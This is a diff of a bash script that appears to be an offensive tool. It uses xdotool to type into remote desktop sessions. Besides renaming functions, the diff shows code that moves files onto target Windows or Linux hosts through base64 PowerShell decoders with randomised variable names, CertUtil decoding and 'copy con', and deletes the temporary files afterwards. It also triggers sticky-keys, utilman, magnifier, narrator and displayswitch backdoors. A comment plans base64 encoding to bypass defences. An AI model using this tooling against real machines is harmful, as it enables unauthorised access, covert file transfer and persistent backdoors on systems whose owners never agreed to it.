@@ -1,5 +1,23 @@
 #!/bin/bash
 
+# TODO: Add check for xfreerdp-x11 and xtightvncviewer
+
+function check_dependencies() {
+    if ! which xdotool &>/dev/null
+    then
+        print_status "warning" "Installing missing dependency..."
+        if [[ ! $(which sudo 2>/dev/null) || $UID -ne 0 ]]
+        then
+            apt install -y xdotool
+        else
+            sudo apt install -y xdotool
+        fi
+        exit 1
+    fi
+}
+
+# Helpers functions
+
 function print_status {
     local status=$1
     local message=$2
@@ -22,23 +40,7 @@ function print_status {
     echo -e "$color $message"
 }
 
-# TODO: Add check for xfreerdp-x11 and xtightvncviewer
-
-function check_dependencies() {
-    if ! which xdotool &>/dev/null
-    then
-        print_status "warning" "Installing missing dependency..."
-        if [[ ! $(which sudo 2>/dev/null) || $UID -ne 0 ]]
-        then
-            apt install -y xdotool
-        else
-            sudo apt install -y xdotool
-        fi
-        exit 1
-    fi
-}
-
-function xdotool_return_input {
+function XDoToolInput {
     local input=$1
     local key=$2
 
@@ -60,7 +62,7 @@ function xdotool_return_input {
     fi
 }
 
-function random_string {
+function RandomString {
     local characters="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
     local length=$(( RANDOM % 13 + 8 ))  # A length of characters between 8 and 20
     local string=""
@@ -74,13 +76,25 @@ function random_string {
     echo "$string"
 }
 
+function LinesOfLength {
+    local file=$1
+    local counter=1
+
+    while read -r line
+    do
+        ((counter++))
+    done < "$file"
+
+    echo "$counter"
+}
+
 function CmdFile {
     local file=$1
 
     print_status "progress" "Executing commands..."
     while read -r line
     do
-        xdotool_return_input "$line" "escapechars"
+        XDoToolInput "$line" "escapechars"
     done < "$file"
     print_status "completed" "Task completed!"
 }
@@ -92,7 +106,7 @@ function Execute {
     case "$method" in
         "none")
             print_status "progress" "Executing commands..."
-            xdotool_return_input "$commands" "escapechars"
+            XDoToolInput "$commands" "escapechars"
             print_status "completed" "Task completed!"
             ;;
         "dialogbox")
@@ -120,8 +134,8 @@ function DialogBox {
     fi
 
     print_status "progress" "Executing commands..."
-    xdotool_return_input "Super+r" "customkey"
-    xdotool_return_input "$commands" "escapechars"
+    XDoToolInput "Super+r" "customkey"
+    XDoToolInput "$commands" "escapechars"
     print_status "completed" "Task completed!"
 }
 
@@ -173,13 +187,13 @@ function Base64 {
     local platform=$3
     local mode=$4
 
-    local random1=$(random_string)
-    local random2=$(random_string)
+    local random1
+    local random2
 
     # TODO: Implement encryption method through base64 with -b,--bypass flag
     # iconv -t UTF-16LE file.txt | gzip -c | openssl enc -a -e -A
     # gzip -c file.exe | openssl enc -a -e -A
-    
+
     # Check if input is passed as file
     if [[ -f "$input" && ("$platform" = "windows" || "$platform" = "linux") && "$mode" = "powershell" ]]
     then
@@ -192,6 +206,9 @@ function Base64 {
             file=$(base64 -w 0 "$input")
         fi
 
+        random1=$(RandomString)
+        random2=$(RandomString)
+
         base64_decoder=$(cat <<EOF
 \$${random1} = "$file"
 [byte[]]\$${random2} = [Convert]::FromBase64String(\$${random1})
@@ -203,7 +220,7 @@ EOF
         print_status "progress" "Transferring file..."
         while IFS= read -r line
         do
-            xdotool_return_input "$line" "return"
+            XDoToolInput "$line" "return"
         done <<< "$base64_decoder"
         print_status "completed" "File transferred!"
     elif [[ "$platform" = "linux" && "$mode" = "console" ]]
@@ -211,7 +228,7 @@ EOF
         base64_data=$(base64 -w 0 "$input")
         while IFS= read -r line
         do
-            xdotool_return_input "echo -n $line | base64 -d > $output_file" "return"
+            XDoToolInput "echo -n $line | base64 -d > $output_file" "return"
         done <<< "$base64_data"
         print_status "completed" "File transferred!"
     fi
@@ -222,18 +239,18 @@ function Bin2Hex {
     local output_file=$2
     local platform=$3
     local mode=$4
-    
+
     echo "Not implemented"
-    
+
     data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
     length=${#data}
-    
+
     # one line HEX value without spaces , columns ,addresses (either echo or tee to logging by appending)
 
     # C:\> certutil -f -encodehex scan.bat hex_type_12.hex 12
-    
+
     # For powershell.exe split the hex oneliner into chunks to decode it easily in a for loop
-    
+
     # See if it's possible with cmd.exe using batch scripting
 }
 
@@ -243,7 +260,7 @@ function PowershellOutFile {
     local platform=$3
     local mode=$4
 
-    local random_temp=$(random_string)
+    local random_temp=$(RandomString)
 
     if [[ "$platform" != "windows" && "$platform" != "linux" ]]
     then
@@ -271,13 +288,13 @@ function PowershellOutFile {
                 done < "$input"
 
                 echo print_status "progress" "Transferring file..."
-                xdotool_return_input "@'" "escapechars"
+                XDoToolInput "@'" "escapechars"
                 while read -r line
                 do
-                    xdotool_return_input "$line" "return"
+                    XDoToolInput "$line" "return"
                 done < "$input"
 
-                xdotool_return_input "'@ | Out-File $output_file" "escapechars"
+                XDoToolInput "'@ | Out-File $output_file" "escapechars"
             else
                 echo print_status "warning" "This is a binary file! Switching to 'pwshcertutil' method instead..."
                 PowershellOutFile "$input" "$output_file" "$platform" "certutil"
@@ -288,19 +305,19 @@ function PowershellOutFile {
         then
             print_status "progress" "Transferring file..."
             base64_data=$(base64 -w 64 "$input")
-            xdotool_return_input "@'" "escapechars"
-            xdotool_return_input "-----BEGIN CERTIFICATE-----" "escapechars"
+            XDoToolInput "@'" "escapechars"
+            XDoToolInput "-----BEGIN CERTIFICATE-----" "escapechars"
 
             while IFS= read -r line
             do
-                xdotool_return_input "$line" "return"
+                XDoToolInput "$line" "return"
             done <<< "$base64_data"
 
-            xdotool_return_input "-----END CERTIFICATE-----" "escapechars"
-            xdotool_return_input "'@ | Out-File ${random_temp}.txt" "escapechars"
-            xdotool_return_input "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
+            XDoToolInput "-----END CERTIFICATE-----" "escapechars"
+            XDoToolInput "'@ | Out-File ${random_temp}.txt" "escapechars"
+            XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
 
-            xdotool_return_input "Remove-Item -Force ${random_temp}.txt" "return"
+            XDoToolInput "Remove-Item -Force ${random_temp}.txt" "return"
         elif [ "$mode" = "hex" ]
         then
             data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
@@ -326,7 +343,7 @@ function CopyCon {
     local platform=$3
     local mode=$4
 
-    local random_temp=$(random_string)
+    local random_temp=$(RandomString)
 
     if [ "$platform" != "windows" ]
     then
@@ -352,17 +369,17 @@ function CopyCon {
         done < "$input"
 
         print_status "progress" "Transferring file..."
-        xdotool_return_input "copy con $output_file" "return"
+        XDoToolInput "copy con $output_file" "return"
 
-        line_count=$(wc -l < "$input")
+        lines_of_length=$(LinesOfLength "$input")
         counter=1
         while read -r line
         do
-            if [ "$counter" -ne "$line_count" ]
+            if [ "$counter" -ne "$lines_of_length" ]
             then
-                xdotool_return_input "$line" "return"
+                XDoToolInput "$line" "return"
             else
-                xdotool_return_input "$line" "copycon"
+                XDoToolInput "$line" "copycon"
             fi
             ((counter++))
         done < "$input"
@@ -378,17 +395,17 @@ function CopyCon {
         fi
 
         print_status "progress" "Transferring file..."
-        xdotool_return_input "copy con ${random_temp}.txt" "return"
-        xdotool_return_input "-----BEGIN CERTIFICATE-----" "escapechars"
+        XDoToolInput "copy con ${random_temp}.txt" "return"
+        XDoToolInput "-----BEGIN CERTIFICATE-----" "escapechars"
 
         while IFS= read -r line
         do
-            xdotool_return_input "$line" "return"
+            XDoToolInput "$line" "return"
         done <<< "$string_base64"
 
-        xdotool_return_input "-----END CERTIFICATE-----" "copycon"
-        xdotool_return_input "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
-        xdotool_return_input "del /f ${random_temp}.txt" "return"
+        XDoToolInput "-----END CERTIFICATE-----" "copycon"
+        XDoToolInput "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
+        XDoToolInput "del /f ${random_temp}.txt" "return"
     elif [ "$mode" = "hex" ]
     then
         data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
@@ -454,7 +471,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
-        xdotool_return_input "shift shift shift shift shift" "customkey"
+        XDoToolInput "shift shift shift shift shift" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -483,7 +500,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
-        xdotool_return_input "Super+u" "customkey"
+        XDoToolInput "Super+u" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -512,8 +529,8 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
-        xdotool_return_input "Super+equal" "customkey"
-        xdotool_return_input "Super+minus" "customkey"
+        XDoToolInput "Super+equal" "customkey"
+        XDoToolInput "Super+minus" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -542,7 +559,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
-        xdotool_return_input "Super+Return" "customkey"
+        XDoToolInput "Super+Return" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
@@ -571,7 +588,7 @@ EOF
     elif [ "$mode" = "backdoor" ]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
-        xdotool_return_input "Super+p" "customkey"
+        XDoToolInput "Super+p" "customkey"
         print_status "completed" "Backdoor Activated!"
     else
         print_status "error" "Invalid mode!"
